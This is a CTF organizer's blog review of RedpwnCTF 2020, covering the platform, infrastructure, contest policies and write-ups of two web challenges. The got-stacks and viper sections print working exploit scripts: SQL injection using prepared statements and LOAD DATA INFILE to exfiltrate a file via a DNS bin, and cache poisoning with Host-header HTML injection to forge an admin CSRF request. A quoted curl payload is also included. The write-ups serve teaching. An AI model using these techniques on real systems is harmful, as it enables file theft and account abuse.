---
layout: post
title: RedpwnCTF in review
excerpt: "Over the past week, RedpwnCTF 2020 took place and I was one of the organizers of the event. I would really like to give props to my team members and additional organizers of the contest for putting together such an event."
categories: [Blog]
tags: [web, redpwnctf]
---

#### Overall thoughts

Over the past week, RedpwnCTF 2020 took place and I was one of the organizers of the event. I would really like to give props to my team members and additional organizers of the contest for putting together such an event. The goal for this year was to make RedpwnCTF one of the highest-quality CTFs that would be hosted this year and I believe that this goal was achieved. From creating and running our own CTF platform, having challenges for competitors of all skill levels, and an overall amazing infrastructure, I must say that the event went as well as I possibly could've imagined it. The following will be my thoughts and experiences on helping run this CTF.

#### Infrastructure

First, I would like to speak about the platform used during the competition, rCTF. The creation of such a platform and the subsequent success was due to the high aspirations for RedpwnCTF this year. Many months before the competition, we already began considering what would be best for the success of the competition and decided that it may be a good idea to create our own platform instead of using the extremely popular CTFd platform. This idea stemmed from one major concern and that was the competitors' experience. Having used CTFd for the previous year's RedpwnCTF competition, the sentiment amongst team members was clear; the platform was easy to use but difficult to scale especially for the number of competitors we expected. It is almost accepted now that CTF competitions using CTFd will crash immediately upon competition start as it uses a disproportionate amount of resources for the number of connections it can handle. We wanted to avoid this at all costs to give competitors the best competition experiences. There are two main ways to deal with this situation. One is to simply use more money. By capitalizing on load balancers, it is possible to just have 20 CTFd instances running behind a load balancer and all these issues can be avoided. The problem with this is that having such an infrastructure does have a non-negligible cost. Although for our 1-week contest the credits we had may have been enough to implement this plan, it seems counter-intuitive that a CTF platform that essentially hosts text and allows submissions of flags should be so inefficient. The other option for solving the CTFd problem was to create our own platform. This was ultimately what we chose to do and many different people invested a lot of time and effort to make this plan a reality.

 When first looking at creating such a platform it seems simple. As I stated before the core functionality is pretty simple, host text and accept flag submissions. What made it take so long? Although it may be possible to create a crude web application including the frontend and backend in a weekend, all developers of rCTF strived to make the platform the best. This means carefully reviewing code and other features to make sure our platform was fast. After all, the main reasons for even creating our own platform were so that it performed well under load, unlike CTFd. Additionally, another issue for me was time. Everyone working on the platform was simultaneously now a student and software developer and I personally was not able to dedicate as much time as I would've liked to the project.  After having worked on the core functionality of the platform for a couple of months, I regretfully had to stop contributing to the project as schoolwork continued to increase. This means especially towards the end of development of the platform I was not familiar with the major changes made so what I am writing about will primarily be during the period I made contributions to the project. Now, although the platform did take quite a while to develop and become production-ready, the features and design considerations are worthy of being discussed. As I mentioned earlier, speed and efficiency were one of the highest priorities for the platform. Some steps we took to achieve this were making sure our backend api was optimized for efficiency, reducing database calls, and implementing caching where possible. Ginkoid was able to implement caching in Redis for the scoreboard and other key components of the application. Additionally, optimizations were also made to the frontend as we decided to combine the frontend and backend into one repository. This meant that even if the backend api was fast, serving an under-optimized frontend would still ruin our performance. The key optimization made was to use preact instead of standard react.js. Preact is special as it is much much smaller than react.js which would reduce the load on the servers when serving the client-side code. Further steps took to optimizing the frontend included looking at bundle sizes for all new dependencies included in the project, implementing purge-css and other optimization tools, and capitalizing on caching mechanisms to improve performance.

Thankfully, the time and effort put into optimizing performance were worth it as we were able to avoid the dreaded crash during the CTF start time. After closely monitoring the platform during the first five minutes of the contest we breathed a sigh of relief as it seemed like nothing went wrong. One small hitch which did occur was that someone attempted to fuzz the website at an extremely fast rate which caused the platform to go down. However, by reviewing logs and because the platform was hosted behind Cloudflare, the disruption was easily mitigated resulting in only a 5-minute downtime. What was amazing to me is that the competition had over 2000 teams competing and 6000 competitors and this was all done with only two instances of rCTF. If we were using a different platform such as CTFd the performance and required servers would likely be much different. 

This leads me to the next point which was the amazing infrastructure behind the CTF. I can only write about what I saw as most of the infrastructure work was done by Ginkoid, Robert, and Ethan from GS Goofballs. As I stated earlier the actual rCTF platform was only two instances which was amazing to me as it served an enormous amount of people. Even more impressive to me than the platform itself was the challenge infrastructure. Ethan wrote a tool named rCDS which handled the deployment of the challenges to google cloud. The underlying technology used was Kubernetes which I am not familiar enough with the provide details with but the results were very impressive. Kubernetes allowed for a challenge to be always online even when deploying updates to the challenges. Deployment and containerization technologies are something I plan on learning soon due to how powerful they were as I observed during RedpwnCTF. In addition to having the challenges be managed by Kubernetes which maintained two replicas per challenge automatically, the way we were able to deploy challenges directly from GitLab without needing any interactions with the server was very nice. This pipeline is called continuous deployment and essentially how the workflow progressed was challenge authors like myself would upload or update our challenges to GitLab. Then all we had to do was run a deploy and it rCDS would automatically check to make sure our configurations for Kubernetes for each challenge were written correctly and it would automatically deploy these to google cloud and Kubernetes. This made the process of updating challenges seamless and due to the always-online nature of Kubernetes. Competitors would for the most part be unaware of minor changes made to challenges such as increasing their reliability or backend side changes such as modifications to the Kubernetes configuration for a challenge. Once again, I must give props to Ethan for his work on rCDS and the overall infrastructure of the competition.

#### Policies during the CTF


During the competition, we came up with some policies which we would abide by to make sure competitors got what they expected and maintained the integrity of the contest. 

The first policy which I believe most other organizers, at least at the high school/college level, should follow is that even when there is an unintended solution to the problem, you should not patch it or patch it in a different version of the challenge and release it during the CTF. This is because an exploit is still an exploit and if the competitor saw one way to attack the problem, it is still a valid solution. The reasoning behind not releasing a version two is that if an attacker saw one way to exploit the challenge it would be unfair to say the way they saw how to exploit the challenge was wrong. During RedpwnCTF this was a problem for two web challenges, cookie-recipes-v2 and post-it-notes. Both of these challenges became much easier than they were intended to due to a path traversal in cookie-recipes-v2 and trivial command injection in post-it-notes but we stuck with the policy of not removing unintended solutions during the CTF. Ultimately this made these relatively difficult challenges much easier however I still believe this is correct because it does not take away from the people who found the unintended solution. Although this is a pretty debated topic for which both sides can be taken, I think that releasing challenges that remove one exploit path or another challenge in which the same solution can be used twice is not the proper decision as a competition organizer.

This policy closely lines up with another policy we had for the CTF which was to not release challenges during the middle of the CTF. One of the main reasons behind this policy was to make it so that competitors could see all the challenges which they could attempt and decide what they wanted to do. In my opinion, this promotes learning as competitors get to choose to attack what they don't know or believe they have an idea for. Additionally, this policy should be even more closely observed for high school/college CTFs where there is a chance that a team will max or complete all the challenges. This is because it makes the competition then not who solved all the challenges faster but rather who solves the last challenge the fastest. Although this was not a concern during RedpwnCTF, other challenge organizers especially for CTFs where there is a chance that teams will max should consider this policy.

Another trend you may have noticed during RedpwnCTF was the lack of a forensics category. This is majorly in part that it is very difficult to write good forensics challenges. Having competed in many high school CTFs, the lack of quality and the amount of guessing needed for forensics challenges is very high. The reasoning behind this is not because the challenge authors are bad at writing challenges but rather it is the nature of forensics challenges. Often they require an inordinate amount of "inspiration" which is trivial to the challenge author but may seem like a far reach to competitors. It is due to this nature of forensics challenges that we decided not to have them as a category this year. It is important to understand that I am not advocating for the removal of the category but rather that all forensics challenges should require a few people to test solve the challenge and make sure that it does not require crazy levels of creativity or inspiration which is unlikely to the average competitor. With this in mind, we decided to not have forensics challenges in our CTF as we did not feel confident in releasing challenges which would be considered not guessy due to the time constraints we had. However, with even more time to prepare and write challenges, I'm sure that a fun, interesting, and not guessy forensics category would be possible to create for sure.

The last policy which I will talk about is the release of source code for all the web challenges and for the most part all the challenges where we could release it and not make the challenge trivial. This is because we value the problem-solving aspect of CTFs and the importance of research in new exploitation techniques. If the source is not disclosed, many challenges become black-box fuzzing or guessing the code that is behind the application facing you. We decided to remove the guessing the code aspect and instead provide the source code for the challenges. This made it so that the difficulty was not in who could guess the code behind the application or the characters/phrases which are banned behind a WAF but instead how they could exploit the application. Although this did make the solve counts of the challenges increase greatly, I believe this was a good thing rather than a bad thing as CTFs are all about learning new techniques and improving your skills and the best way to do that is by actually exploiting instead of searching for what to exploit. 

These were the policies we as organizers followed during RedpwnCTF. I hope that the reasoning behind the decisions we made is clear and that these policies made it a fair playground for all those who competed. I advise other contest organizers to look at the reasons behind the decisions made for RedpwnCTF and see if they can apply it to their competition.

#### My challenges

For the CTF I wrote two challenges, got-stacks and viper which I tried to make pretty interesting and at a medium-hard difficulty. I will explain my inspirations behind each challenge and how they were created.

#####  got-stacks

The inspiration for this challenge began with using variables within MySQL as well as needing to exfiltrate files from the filesystem on which MySQL was being run. In order to make variables a part of a challenge, it was only possible with multiple statements and I did this by enabling stacked queries. Now a challenge with just stacked queries would be too easy, so in order to make it harder, I decided to add a WAF (web application firewall). The following were the words that were blacklisted.
```javascript
const KEYWORDS = [
 "union","and","or","sleep","hex","char","db","\\\\",
 "/","*","load_file","0x","fl","ag","txt","if"
];
```
At first this blacklist seems pretty strong. In MySQL, it is difficult to use the key commands like `union` or `and` if they are purely blacklisted by the WAF. After doing a bit of research, I found the primitive that I wanted competitors to use. Essentially with stacked queries, it is possible to prepare statements then execute them. To me this seemed like one of the few ways to bypass the WAF, if there are other interesting ways to bypass filters which blacklist `and` or `or` please contact me and let me know. In order to make exfiltration easy, I built a path in the web application so that the exfiltration could be done in a one-shot manner. This path was essentially build a `load_data_infile` query which would load the flag into an outfile using select and prepared statements. The specific query would load the data from flag.txt into the stock table with a known id, stock set to 0, and the vurl would be a URL which could exfil the flag via  a DNSbin. Why this was required is because load_data_infile will not let you load a file with a dynamic name which means you can't load it from for example X'' hex bypass as many teams used. Then, you can use the initializedb route to execute the SQL statements in the outfile and then run notifystock to exfil it. Here is my exploit script.
```python
import requests
import json

base_url = "http://localhost:4001"

# step 1 -> inject sql statement to create new entry

dns_req_bin = input("Enter your dns req bin url (.url.com): ")

data = {"stockid": "416", "name": "a", "quantity": "0", "vurl": "a'); SET @f=0b001011110110100001101111011011010110010100101111011000110111010001100110001011110110011001101100011000010110011100101110011101000111100001110100; SET @w=0b0010111101101000011011110110110101100101001011110110001101110100011001100010111101100001011100000111000000101111011001000110001000101111011100100111000000101110011100110111000101101100; SET @q = CONCAT(\"LOAD DATA INFILE '\", @f, \"' INTO TABLE stock (@t) SET stockid=111, quantity=0, vurl=CONCAT(@t, '" + dns_req_bin + "');\"); SET @z = CONCAT(\"SELECT @q INTO OUTFILE '\", @w,\"'\"); PREPARE s from @z; EXECUTE s;-- "}
data_json = json.dumps(data)
headers = {"Content-Type": "application/json"}

r = requests.post(base_url + "/api/registerproduct", headers=headers, data=data_json)

print(r.text)

# step 2 -> execute sql

data = {"filename": "rp.sql"}
data_json = json.dumps(data)
headers = {"Content-Type": "application/json"}

r = requests.post(base_url + "/api/initializedb", headers=headers, data=data_json)

print(r.text)

# step 3 -> execute data

data = {"stockid": "111"}
data_json = json.dumps(data)
headers = {"Content-Type": "application/json"}

r = requests.post(base_url + "/api/notifystock", headers=headers, data=data_json)

print("Exploit complete, check reqbin")
```
As you can see the application is really built around the exploit path I intended. However, because I am working with DNS I knew that a DNS rebinding attack would be possible. I didn't write an exploit for it but that was the only other solution in my mind. Additionally I knew that the primitive of preparing and executing statements was extremely powerful. This meant that exfiltrating the data via timing based attacks would be possible but there was nothing I could really do to stop it. Maybe I could have made the server resopnd in the same time to all requests but I'm not too sure if that would work. What I really did not expect was some of the cool solutions that I saw. This writeup, published by SamXML from team w01verines on CTFTime and can be found [here](https://ctftime.org/writeup/21988) was really neat. In this writeup he uses a technique that I did not even think about which was the differences between making a GET request to Google's DNS and using request.get within NodeJS. This is why I wanted to build a challenge like this. It needs a lot of creativity but because the source is all available, you can exfiltrate the flag in any manner you want. I am glad that I reached my overall goal of making people learn more about SQL syntax and I am happy with the outcome of this challenge.

##### viper

Viper was a challenge which I was inspired mainly after reading some articles and new research about cache poisoning attacks. Essentially cache poisoning is around the differences between the cache key, which describes when to serve certain data, and the dynamic data itself which relies on a part of the cache. The part where this came up in the challenge is where the cache key is built like this: ``const key = '__rpcachekey__|' + req.originalUrl + req.headers['host'].split(':')[0];`` but in the source code the host header is used this like ``analyticsUrl: 'http://' + req.headers['host'] + '/analytics?ip_address=' + req.headers['x-real-ip']``. The difference is pretty apparent in that the cache key only uses the portion of the host before the `:`. Now is where the nginx config actually matters. The nginx config has the following `proxy_set_header Host $http_host;` which is special because it doesn't use the standard `$host` which would not have included anything past the `:`. Conveniently, this section which is injected via EJS is not injected safely but rather as pure HTML. Now an exploit is clear, we can inject something into the page that would get cached and the admin would visit it.

The next part of the challenge was to realise that the goal was the CSRF the admin to use the `/admin/create` route but the challenge is the unclear CSRF token. To bypass that, the analytics route could be used by setting the parameter to `__csrftoken__admin_account` to see what the current token was and what had to be done was to base64 encode it. This worked because of the way the token was generated as a randomInt and how it was stored in redis which the analytics route also used. Another interesting part of the challenge was that the nginx $http_host has some internal filtering and if it matches the blacklist it will say bad host header. This can be found in the nginx source [here](https://github.com/nginx/nginx/blob/master/src/http/ngx_http_request.c#L2077). How I chose to bypass this was by making my injection very specific. I used the img tag and set the source to the CSRF url. Within this I could encode `/` in hex as `&#47` which allowed me to bypass the filter and still CSRF the admin. 

The last part of the challenge was kind of subtle and some people did not realize this but when the admin creates an admin snake via CSRF, that snake still has some permissions checks. You must be an admin to view it and get the flag. However, because when the admin visits the viper, it will be saved in the cache and unlike visiting the actual URL, there are no permissions checks. Combining these steps, you could exfiltrate the flag. Here is my solve script:
```python
import requests
import base64
import urllib
from time import sleep

base_url = "http://localhost:4002"

s = requests.Session()

# step 1 -> user creates account and gets cookies

r = s.get(base_url + "/create")

viper_id = r.text.split("snake: ")[1].split("</h1>")[0]

print("Viper ID: " + viper_id)

# step 2 -> get csrf token

r = requests.get(base_url + "/analytics?ip_address=__csrftoken__admin_account")

csrfToken = urllib.parse.quote_plus(base64.b64encode(r.text.split("site ")[1].split(" ")[0].encode()))

print("Found CSRF token: " + csrfToken)

# step 3 -> poison server side cache

print("Waiting for previous cache to expire, sleeping for 23 seconds")
sleep(23)

headers = {"host": "localhost:4002<img src='http:&#47;&#47;localhost:4002&#47;admin&#47;create?viperId=eec42479-721b-40ab-9be1-5a93ace9709f&csrfToken=" + csrfToken + "'>"}

r = s.get(base_url + "/viper/" + viper_id, headers=headers, cookies=s.cookies.get_dict())
print(r.text)

# manual step, admin visits poisoned site (can implement using headless chromium)

print("Admin must visit: " + base_url + "/viper/" + viper_id)
print("Sleeping for 10 seconds")

sleep(10)

# get flag

r = requests.get(base_url + "/viper/eec42479-721b-40ab-9be1-5a93ace9709f")

flag = r.text.split("snake: ")[1].split("</h1>")[0]

print(flag)
```
The interesting part of this challenge actually was in how people abused the cache poisoning vulnerability. I was closely following Kernel Sanders solve the problem and they used a completely different path. Instead of using an image tag and using the src element to make a get request, they chose to use the fetch request from the analytics. The following is their payload:
```bash
csrftoken=$(curl -v http://2020.redpwnc.tf:31291/analytics\?ip_address\=__csrftoken__admin_account | cut -d  ' '  -f 7 | tr -d  '\n' | base64 | tr -d  '='); curl -v -H 'Host: 2020.redpwnc.tf:31291\admin\create?viperId=e624d407-d230-4e55-bb04-2e1c24e7cf28&amp;<!--=4&csrfToken='"${csrftoken}"'#-->' -H 'Cookie: connect.sid=s%3AMHc1IM90PLjzqv4WM6DeRW0-UmEKD3Qr.125KdxxAlXzTT4XLia%2BCUQdPe2rIThSoIKdAW1s%2FGRY' http://2020.redpwnc.tf:31291/viper/1bc603db-4385-4baa-b333-8785ca4856e0
```
This was really cool because they chose to abuse the fact that the analytics.js, which I intended only to be make the challenge more realistic and make the CSRF token bypass possible, made a fetch request. This actually works well because the ip is appended to the end of the URL and that can be made it not parsed by making it a page anchor through `#`. However, the problem arose because by default, the browser would convert `&` to `&amp` which would disable the exploit. The bypass for this is actually really interesting and it is because within  `<!-- -->` HTML comments, the parser is laxed and will not encode `&` automatically and thus the attack works because the `<!--` becomes apart of the keypair `amp;<!--=4` which would make this attack work which capitalizes on the built in fetch request.

#### Conclusion

Overall, I thought being an organizer of RedpwnCTF was a great experience. From working on the platform to building challenges that I hoped people would learn from was really rewarding. I am really amazed by what was accomplished for this event even though to many people it was just a 1-week competition. I hope that all people who competed had a great time and I would just like to applaud all the organizers for the work they put in and the great outcome that was a result of all the time and effort.
